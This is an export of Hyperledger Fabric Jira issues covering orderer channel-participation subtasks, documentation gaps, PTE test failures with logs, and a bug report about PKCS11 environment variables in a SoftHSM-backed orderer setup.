Docs: No description for Linux in prerequisites for development environment,FAB-17888,45064,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,ynamiki,ynamiki,ynamiki,14/May/20 9:01 AM,14/May/20 9:17 AM,28/Oct/23 3:10 AM,14/May/20 9:17 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,Documentation,,,,,"In the following page, there is no mention for Linux in libtool and jq, while SoftHSM has `apt-get` sample.
https://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html#prerequisites",,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c0j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/May/20 9:17 AM;ynamiki;The commit f7dc712e42bb0f2952f6d3f7856ed971eb57807c cleans up the description and now this issue is not applicable.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow the Registrar to list all channels,FAB-17889,45065,44978,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,14/May/20 2:58 PM,20/May/20 6:42 PM,28/Oct/23 3:10 AM,20/May/20 6:42 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Allow the registrar to list all channels.
    
Note that all access to the system channel name is now under lock, because with the introduction of this API it is no longer immutable.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c0r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow the Registrar to provide extended state info on a single channel,FAB-17890,45066,44978,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,14/May/20 2:59 PM,03/Jun/20 3:12 AM,28/Oct/23 3:10 AM,03/Jun/20 3:12 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Implement the ChannelInfo(..) method in the registrar that looks up a channel in the chains map and reports extended information on its status. For this end we have to introduce the follower.Chain and augment existing cluster type chains with means of reporting their status.

- Introduce the skeleton a new type of consensus.Chain implementation: follower.Chain. This will be created and run when the orderer is required to follow the cluster and pull blocks from other orderers.
- The plan (for future commits) is for the follower.Chain to trigger the creation of an etcdraft.Chain when it discovers the orderer was 
  added to the cluster, and vise versa; the etcdraft.Chain will replace itself with a follower.Chain when the orderer is removed from the cluster.
- Introduce a new interface that cluster-type chains implement, that allows them to report there relation to the cluster and there status. This is done because the registrar is not aware of the exact type of the chains it is keeping. The registrar cannot reflect on the type as well, as this will cause an import cycle (due to the etcdraft package importing multichannel).
",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c0z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel participation REST API - misc.,FAB-17891,45067,,Story,Backlog,FAB,Fabric,software,denyeart,,,Lowest,,,tock,tock,14/May/20 3:57 PM,20/Jul/20 8:47 PM,28/Oct/23 3:10 AM,,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Support additional Mime types.

Optionally add support for Content-Type application/octet-stream and/or application/json, in case it is requested by users.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i01c17:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support redirect on base URL,FAB-17892,45068,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,14/May/20 5:03 PM,23/Jun/20 6:42 AM,28/Oct/23 3:10 AM,23/Jun/20 3:56 AM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,redirect `GET /participation/v1` to `/participation/v1/channels` with error code StatusFound 302,,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c1f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/20 12:27 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1433];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric dependency to use latest version of fabric-config,FAB-17893,45070,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,14/May/20 10:04 PM,15/May/20 12:33 AM,28/Oct/23 3:10 AM,15/May/20 12:33 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,Bump the version up to latest and update the integration test. ,,wlahti,,,,,,,,,,,,,,,,,,,,,FAB-17894,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzwc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reintroduce OriginalConfig() and UpdatedConfig() retrieval functions,FAB-17894,45071,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,14/May/20 10:25 PM,14/May/20 11:50 PM,28/Oct/23 3:10 AM,14/May/20 11:50 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"While chaining the APIs together, we lost the ability to retrieve the unexported original and updated configs. I noticed this while updating the vendored dependency in fabric and updating the existing integration test via FAB-17893. Without these, we have no way to sanity check that the configs match what we expect when submitting an update using the fabric-config library. ",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17893,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzw6",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enforce maximal request body size on Join,FAB-17895,45073,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,14/May/20 11:42 PM,09/Jul/20 3:53 AM,28/Oct/23 3:10 AM,09/Jul/20 3:53 AM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"Set a config value for `maximal-request-body-size-bytes`.
Check that when processing the POST request, using the http.MaxBytesReader() function.",,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c23:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/20 6:41 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1434];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix db/statedb variables in kv_ledger.go,FAB-17896,45074,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,15/May/20 1:30 AM,15/May/20 1:30 AM,28/Oct/23 3:10 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c2b:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document /version operations endpoint,FAB-17897,45075,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,15/May/20 1:36 AM,11/Jan/21 1:35 AM,28/Oct/23 3:10 AM,11/Jan/21 1:35 AM,,,,,,,,,,,,,,fabric-docs,fabric-quality,,,,,,,,0,,,,,,It appears the operations /version endpoint from FAB-15814 was never documented.,,btl5037,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15814,FABC-904,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c2j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jun/20 1:57 AM;btl5037;[https://hyperledger-fabric.readthedocs.io/en/release-1.4/operations_service.html#version]

We put it in 1.4, but never put in 2.0, we need to cherry-pick forward, I'll take care of it.;;;","13/Jun/20 12:17 PM;btl5037;[https://github.com/hyperledger/fabric/pull/1396/files];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE add information to query block trace,FAB-17898,45076,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,15/May/20 3:48 AM,21/May/20 12:19 AM,28/Oct/23 3:10 AM,21/May/20 12:19 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Add channel, org, and peer to the trace of queryblock",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-2247,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz4",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE chaincode installation failed,FAB-17899,45077,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,dongming,dongming,dongming,15/May/20 4:00 AM,12/Jun/20 3:04 AM,28/Oct/23 3:10 AM,12/Jun/20 3:04 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"In the case of testing, chaincode install failed while transaction invoke and query are running simultaneously.  Because PTE receives transaction failure message instead of installation status message from peer.  This will cause PTE to think the installation fails. 

 

^[[31merror^[[39m: [2020-05-15T12:03:51.938Z PTE 0 main]: [chaincodeInstall] Failed to send install Proposal in (testorgschannel5:PeerOrg1) or receive valid response. Response null or status is not 200. exiting... 0=[code=2, , flags=0, details=error executing chaincode: failed to execute transaction: timeout expired while executing transaction, code=2, , flags=0, details=error executing chaincode: failed to execute transaction: timeout expired while executing transaction], 0=10, 1=94, 2=8, 3=3, 4=16, 5=1, 6=26, 7=12, 8=8, 9=137, 10=138, 11=250, 12=245, 13=5, 14=16, 15=128, 16=224, 17=216, 18=207, 19=2, 20=42, 21=64, 22=98, 23=54, 24=98, 25=100, 26=56, 27=101, 28=53, 29=100, 30=53, 31=51, 32=49, 33=48, 34=102, 35=98, 36=100, 37=101, 38=100, 39=52, 40=51,

 

another failure:

PTE log
 ^[[31merror^[[39m: [2020-05-17T09:23:18.462Z PTE 0 main]: [chaincodeInstall] Failed to send install Proposal in (testorgschannel10:PeerOrg1) or receive valid response. Response null or status is not 200. exiting... 0=[code=2, , flags=0, details=error executing chaincode: failed to execute transaction: timeout expired while executing transaction, version=0, timestamp=null, status=200, message=, 0=79, 1=75, , endorsement=null, url=grpcs://localhost:7062, name=localhost:7062, grpc.max_receive_message_length=-1, grpc.max_send_message_length=-1, grpc.keepalive_time_ms=120000, grpc.http2.min_time_between_pings_ms=120000, grpc.keepalive_timeout_ms=20000, grpc.http2.max_pings_without_data=0, grpc.keepalive_permit_without_calls=1, grpc.ssl_target_name_override=peer1.org1.example.com, grpc.default_authority=peer1.org1.example.com], 0=10, 1=94, 2=8, 3=3, 4=16, 5=1, 6=26, 7=12, 8=8, 9=232, 10=132, 11=132, 12=246, 13=5, 14=16, 15=192, 16=204, 17=150, 18=130, 19=1, 20=42, 21=64, 22=101, 23=56, 24=55, 25=50, 26=51, 27=52, 28=53, 29=53, 30=49, 31=100, 32=48, 33=97, 34=51, 35=51, 36=55, 37=54, 38=101, 39=101, 40=98, 41=53, 42=101, 43=99, 44=52, 45=50, 46=49, 47=50, 48=53, 49=53, 50=100, 51=52, 52=50, 53=51, 54=53, 55=54, 56=51, 57=50, 58=102, 59=48, 60=51, 61=51, 62=100, 63=50, 64=57, 65=48, 66=100, 67=98, 68=50, 69=98, 70=98, 71=98, 72=52, 73=97, 74=53, 75=55, 76=99, 77=49, 78=55, 79=54, 80=56, 81=48, 82=102, 83=99, 84=101, 85=51, 86=58, 87=8, 88=18, 89=6, 90=18, 91=4, 92=108, 93=115, 94=99, 95=99, 96=18, 97=212, 98=6, 99=10, 100=183, 101=6, 102=10, 103=8, 104=80, 105=101, 106=101, 107=114, 108=79, 109=114, 110=103, 111=49, 112=18, 113=170, 114=6, 115=45, 116=45, 117=45, 118=45, 119=45, 120=66, 121=69, 122=71, 123=73, 124=78, 125=32, 126=67, 127=69, 128=82, 129=84, 130=73, 131=70, 132=73, 133=67, 134=65, 135=84, 136=69,

peer log
 ^[[36m2020-05-17 09:23:17.911 UTC [couchdb] handleRequest -> DEBU 16c1d8c^[[0m HTTP Request: POST /testorgschannel1_marbles02_ch1/_all_docs?include_docs=true HTTP/1.1 | Host: couchdb0:5984 | User-Agent: Go-http-client/1.1 | Content-Length: 51 | Accept: application/json | Content-Type: application/json | Accept-Encoding: gzip | |
 ^[[36m2020-05-17 09:23:17.911 UTC [couchdb] handleRequest -> DEBU 16c1d8d^[[0m HTTP Request: POST /testorgschannel1_lscc/_all_docs?include_docs=true HTTP/1.1 | Host: couchdb0:5984 | User-Agent: Go-http-client/1.1 | Content-Length: 26 | Accept: application/json | Content-Type: application/json | Accept-Encoding: gzip | |
 ^[[36m2020-05-17 09:23:18.460 UTC [chaincode] Execute -> DEBU 16c1d8e^[[0m Exit
 ^[[31m2020-05-17 09:23:18.460 UTC [chaincode] ExecuteChaincode -> ERRO 16c1d8f^[[0m timeout expired while executing transaction
 github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Execute
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:813
 github.com/hyperledger/fabric/core/chaincode.Execute
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/exectransaction.go:58
 github.com/hyperledger/fabric/core/chaincode.ExecuteChaincode
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/chaincodeexec.go:85
 github.com/hyperledger/fabric/core/endorser.(*SupportImpl).Execute
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/support.go:93
 github.com/hyperledger/fabric/core/endorser.(*Endorser).callChaincode
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:132
 github.com/hyperledger/fabric/core/endorser.(*Endorser).simulateProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:265
 github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:491
 github.com/hyperledger/fabric/core/handlers/auth/filter.(*expirationCheckFilter).ProcessProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/handlers/auth/filter/expiration.go:61
 github.com/hyperledger/fabric/core/handlers/auth/filter.(*filter).ProcessProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/handlers/auth/filter/filter.go:31
 github.com/hyperledger/fabric/protos/peer._Endorser_ProcessProposal_Handler
 /opt/gopath/src/github.com/hyperledger/fabric/protos/peer/peer.pb.go:112
 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC
 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:781
 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream
 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:981
 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1
 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:551
 runtime.goexit
 /opt/go/src/runtime/asm_amd64.s:2337
 failed to execute transaction
 error executing chaincode
 ^[[36m2020-05-17 09:23:18.460 UTC [endorser] callChaincode -> DEBU 16c1d90^[[0m [][e8723455] Exit",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-2247,,,No,,Unset,No,,,"1|hzwqrp:jr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jun/20 3:04 AM;dongming;The issue is observed in fabric v1.1 which to be sunset soon.

We will reopen this if reported in fabric 2.0 releases;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer is not able to recognize PKCS11 Docker Environment Variables,FAB-17900,45080,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,tsharris,InRu,InRu,15/May/20 8:28 PM,05/May/21 8:37 PM,28/Oct/23 3:10 AM,30/May/20 6:20 AM,v1.4.6,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"Orderer can't be started with PKCS#11 support (usage of SoftHSM). It seems, that the environment variables are not evaluated correctly. This results in different error messages:

1. 'PKCS11.security' expected type 'int', got unconvertible type 'string'
2. An invalid KeyStore path provided. Path cannot be an empty string
",,InRu,sykesm,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17969,FAB-18457,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzzf",,,,Unset,Unset,,"Steps I've done:
1. Installation of SoftHSM
2. Installation of OpenSC (for tool: pkcs11-tool)
3. Initialise Token of SoftHSM
   - softhsm2-util --init-token --slot 0 --label ""ForFabric"" --so-pin 1234 --pin 98765432
     (new Slot ID 0x231267b0 = 588408752)
4. Test access to SoftHSM (HSM Lib)
   - sudo pkcs11-tool -v -L --module /usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so
5. Import the prvKeys (generated with cryptogen) of the Org Orderer and the Org Admin
   into the SoftHSM. I don't know accurate, what has to be present in the HSM and what stays in the previous used directories ?!?
   - pkcs11-tool --module /usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so -l --pin 98765432 --write-object ./4ea36183f09dca49c192839db279e075a4a8c30fa2aa83fbbd4323686deb22cc_sk --type privkey --id 588408752
   - pkcs11-tool --module /usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so -l --pin 98765432 --write-object ./3f89ba51e920a1e0e7991a63aee8aae57eeda0fc985c505fc3fffed35a7be4e5_sk --type privkey --id 588408752
6. Check, if imported keys (actualle key pairs) are present
   - sudo pkcs11-tool -O -v --pin 98765432 --module /usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so
7. Build of Hyperledger Fabric V1.4.7
   GO_TAGS=pkcs11 make dist-clean all
8. Generate Genesis-Block for Orderer
- configtxgen -profile OneOrgOrdererGenesis -outputBlock $PROJECT_DIR/configTransactions/genesis.block -channelID mysystemchannel
9. start Orderer
- docker-compose -f myOrderer.yaml up myOrderer
----------------------------------------
Test 1
----------------------------------------
Configuration of my own myOrderer.yaml

services:
  myOrderer: 
    container_name: myOrderer 
    image: ""hyperledger/fabric-orderer:${IMAGE_TAG}""
    environment:
      - SOFTHSM2_CONF=/etc/hyperledger/fabric/HSM_config/softhsm2.conf
      - FABRIC_LOGGING_SPEC=debug
      - ORDERER_GENERAL_LISTENADDRESS=0.0.0.0
      - ORDERER_GENERAL_GENESISMETHOD=file
      - ORDERER_GENERAL_GENESISFILE=/etc/hyperledger/configtx/genesis.block
      - ORDERER_GENERAL_LOCALMSPID=myMSP
      - ORDERER_GENERAL_LOCALMSPDIR=/etc/hyperledger/msp/orderer/msp
      ### New stuff for PKCS#11
      - ORDERER_GENERAL_BCCSP_DEFAULT=PKCS11
      - ORDERER_GENERAL_BCCSP_PKCS11_HASH=SHA2
      - ORDERER_GENERAL_BCCSP_PKCS11_SECURITY=256
      - ORDERER_GENERAL_BCCSP_PKCS11_LIBRARY=/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so
      - ORDERER_GENERAL_BCCSP_PKCS11_PIN=98765432
      - ORDERER_GENERAL_BCCSP_PKCS11_LABEL=ForFabric

Output of myOrderer during start

map[consensus:map[SnapDir:/var/hyperledger/production/orderer/etcdraft/snapshot WALDir:/var/hyperledger/production/orderer/etcdraft/wal] debug:map[BroadcastTraceDir:<nil> DeliverTraceDir:<nil>] fileledger:map[Location:/var/hyperledger/production/orderer Prefix:hyperledger-fabric-ordererledger] general:map[Authentication:map[NoExpirationChecks:<nil> TimeWindow:15m] BCCSP:map[Default:PKCS11 PKCS11:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Label:ForFabric Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so Pin:98765432 Security:256] SW:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Security:256]] Cluster:map[CertExpirationWarningThreshold:<nil> ClientCertificate:<nil> ClientPrivateKey:<nil> DialTimeout:<nil> ListenAddress:<nil> ListenPort:<nil> RPCTimeout:<nil> ReplicationBackgroundRefreshInterval:<nil> ReplicationBufferSize:<nil> ReplicationMaxRetries:<nil> ReplicationPullTimeout:<nil> ReplicationRetryTimeout:<nil> RootCAs:<nil> SendBufferSize:10 ServerCertificate:<nil> ServerPrivateKey:<nil> TLSHandshakeTimeShift:<nil>] ConnectionTimeout:<nil> GenesisFile:/etc/hyperledger/configtx/genesis.block GenesisMethod:file GenesisProfile:SampleInsecureSolo Keepalive:map[ServerInterval:7200s ServerMinInterval:60s ServerTimeout:20s] LedgerType:file ListenAddress:0.0.0.0 ListenPort:7050 LocalMSPDir:/etc/hyperledger/msp/orderer/msp 